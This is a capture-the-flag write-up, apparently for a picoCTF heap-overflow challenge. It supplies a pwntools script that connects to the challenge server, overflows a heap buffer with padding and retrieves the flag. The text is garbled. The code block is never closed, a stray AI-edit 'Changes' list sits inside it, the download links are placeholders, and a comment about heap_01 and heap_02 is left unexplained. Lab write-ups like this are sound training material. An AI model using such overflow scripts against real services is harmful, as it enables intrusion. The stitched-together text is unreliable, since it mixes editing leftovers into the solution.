# Description

Can you handle function pointers?  
Download the binary [here](#).  
Download the source [here](#).  
Additional details will be available after launching your challenge instance.

---

# Solution

The first step is to use `wget` to download the source code and the executable file.  
You'll need to use the `pwntools` library because simply interacting manually won't reveal the flag. Using `print(p.recvall())` ensures you capture all the output.

Below is a simple Python script using `pwntools` to automate the process:

```python
from pwn import *  # Import from the pwntools library

# Connect to the remote server
p = remote("mimas.picoctf.net", 49262)

# Send the first input
p.sendline(b"2")

# Receive the prompt for buffer
p.recvuntil(b"buffer:")

# Send a payload to overflow the heap
p.sendline(b"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX")

# Receive the next prompt
p.recvuntil(b"choice:")

# Send the choice to proceed
p.sendline(b"4")

# Receive and print the flag
print(p.recvall())  # Receive the flag and analyze the difference between heap_01 and heap_02

### Changes:
1. Improved grammar and readability.
2. Added placeholder links for the binary and source files.
3. Properly formatted the script in a code block.
4. Used clear headings and spacing for better structure.

Before copying the code, take a moment to understand each step.
Good luck, and I hope this brings you success and happiness! 🙂
